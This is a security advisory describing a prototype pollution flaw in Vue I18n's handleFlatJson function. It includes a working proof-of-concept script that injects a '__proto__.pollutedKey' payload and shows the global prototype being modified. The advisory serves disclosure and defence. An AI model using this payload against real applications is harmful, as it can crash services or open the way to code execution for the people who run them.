summary: "Vue I18n Allows Prototype Pollution in `handleFlatJson`\n**Vulnerability type:**\n\
  Prototype Pollution\n\n**Vulnerability Location(s):**\n```js\n# v9.1\nnode_modules/@intlify/message-resolver/index.js\n\
  \n# v9.2 or later\nnode_modules/@intlify/vue-i18n-core/index.js\n```\n\n**Description:**\n\
  \nThe latest version of `@intlify/message-resolver (9.1)` and `@intlify/vue-i18n-core (9.2\
  \ or later)`, (previous versions might also affected), is vulnerable to Prototype Pollution\
  \ through the entry function(s) `handleFlatJson`. An attacker can supply a payload with Object.prototype\
  \ setter to introduce or modify properties within the global prototype chain, causing denial\
  \ of service (DoS) a the minimum consequence.\n\nMoreover, the consequences of this vulnerability\
  \ can escalate to other injection-based attacks, depending on how the library integrates within\
  \ the application. For instance, if the polluted property propagates to sensitive Node.js\
  \ APIs (e.g., exec, eval), it could enable an attacker to execute arbitrary commands within\
  \ the application's context.\n\n\n**PoC:**\n\n```bash\n// install the package with the latest\
  \ version\n~$ npm install @intlify/message-resolver@9.1.10\n// run the script mentioned below\
  \ \n~$ node poc.js\n//The expected output (if the code still vulnerable) is below. \n// Note\
  \ that the output may slightly differs from function to another.\nBefore Attack:  {}\nAfter\
  \ Attack:  {\"pollutedKey\":123}\n```\n\n```js\n// poc.js\n(async () => {\n    const lib =\
  \ await import('@intlify/message-resolver');\n    var someObj = {}\n    console.log(\"Before\
  \ Attack: \", JSON.stringify({}.__proto__));\n    try {\n        // for multiple functions,\
  \ uncomment only one for each execution.\n        lib.handleFlatJson ({ \"__proto__.pollutedKey\"\
  : \"pollutedValue\" })\n    } catch (e) { }\n    console.log(\"After Attack: \", JSON.stringify({}.__proto__));\n\
  \    delete Object.prototype.pollutedKey;\n})();\n```"
